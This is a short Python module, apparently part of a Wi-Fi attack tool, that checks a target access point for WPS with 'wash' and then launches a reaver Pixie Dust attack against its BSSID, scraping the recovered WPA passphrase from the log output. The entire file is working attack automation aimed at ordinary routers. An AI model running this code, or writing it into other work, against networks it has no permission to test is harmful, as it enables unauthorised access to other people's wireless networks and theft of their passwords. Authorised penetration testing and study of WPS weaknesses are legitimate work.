import os
import pexpect
from poormanslogging import info, warn, error

import src.settings as settings

def check():
	cmd_wps = pexpect.spawn('wash -i {0}'.format(settings.INTERFACE_MON))
	cmd_wps.logfile = open(settings.LOG_FILE, 'wb')
	cmd_wps.expect([settings.TARGET_BSSID, pexpect.TIMEOUT, pexpect.EOF], 30)
	cmd_wps.close()

	wps = False
	parse_log_wps = open(settings.LOG_FILE, 'r')
	for line in parse_log_wps:
		if line.find(settings.TARGET_BSSID) != -1:
			wps = True
	parse_log_wps.close()
	os.remove(settings.LOG_FILE)

	return wps

def pixiedust():
	info("Trying PixieDust attack")
	cmd_reaver = pexpect.spawn(
			'reaver -i {0} -c {1} -b {2} -s n -K 1 -vv'.format(settings.INTERFACE_MON, settings.TARGET_CHANNEL, settings.TARGET_BSSID))
	cmd_reaver.logfile = open(settings.LOG_FILE, 'wb')
	cmd_reaver.expect(['WPS pin not found!', pexpect.TIMEOUT, pexpect.EOF], 30)
	cmd_reaver.close()

	parse_log_crack = open(settings.LOG_FILE, 'r')
	for line in parse_log_crack:
		if line.find('WPA PSK: ') != -1:
			settings.TARGET_KEY = line[line.find("WPA PSK: '") + 10:-1]
	parse_log_crack.close()
	os.remove(settings.LOG_FILE)
